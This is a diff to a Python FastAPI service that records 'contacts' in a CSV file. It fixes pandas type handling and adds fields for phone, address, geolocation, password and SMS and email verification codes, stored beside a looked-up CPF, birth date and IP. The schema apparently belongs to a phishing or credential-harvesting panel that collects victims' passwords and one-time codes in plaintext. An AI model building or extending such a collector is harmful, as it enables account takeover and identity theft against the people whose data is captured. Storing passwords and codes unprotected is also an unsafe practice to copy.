@@ -68,10 +68,9 @@ def get_current_datetime() -> str:
 def read_contacts():
     ensure_csv_exists()
     try:
-        df = pd.read_csv(CSV_FILE_PATH)
+        df = pd.read_csv(CSV_FILE_PATH, dtype=str)  # Certifica que todos os dados são strings
         df.columns = CSV_COLUMNS
         df = df.fillna('')  # Substitui NaNs por strings vazias
-        df = df.astype(str)  # Certifica que todos os dados são strings
         return df.to_dict(orient='records')
     except Exception as e:
         raise HTTPException(status_code=500, detail=str(e))
@@ -116,14 +115,20 @@ def start_contact(contact: ContactStart, response: Response, request: Request):
             "cpf": format_cpf(cpf_data["cpf"]),
             "nascimento": format_date(cpf_data["nasc"]) if cpf_data.get("nasc") else "N/A",
             "data": get_current_datetime(),
-            "ip": contact.ip
+            "ip": contact.ip,
+            "telefone": "",
+            "endereco": "",
+            "geo": "",
+            "senha": "",
+            "codigo_telefone": "",
+            "codigo_email": ""
         }
 
         # Armazenar os dados iniciais na sessão
         sessions[new_id] = new_contact
 
         # Atualizar o CSV com a nova linha
-        df = pd.read_csv(CSV_FILE_PATH)
+        df = pd.read_csv(CSV_FILE_PATH, dtype=str)
         df.columns = CSV_COLUMNS
         df = pd.concat([df, pd.DataFrame([new_contact])], ignore_index=True)
         df.to_csv(CSV_FILE_PATH, index=False)
@@ -165,9 +170,10 @@ def complete_contact(contact: ContactComplete, session_id: Optional[str] = Cooki
                 sessions[session_id][key] = value
 
         # Atualizar o CSV com os dados da sessão
-        df = pd.read_csv(CSV_FILE_PATH)
+        df = pd.read_csv(CSV_FILE_PATH, dtype=str)
         df.columns = CSV_COLUMNS
-        df.loc[df['id'] == session_id, list(sessions[session_id].keys())] = list(sessions[session_id].values())
+        for key, value in sessions[session_id].items():
+            df.loc[df['id'] == session_id, key] = value
         df.to_csv(CSV_FILE_PATH, index=False)
 
         return {"message": "Session updated successfully"}
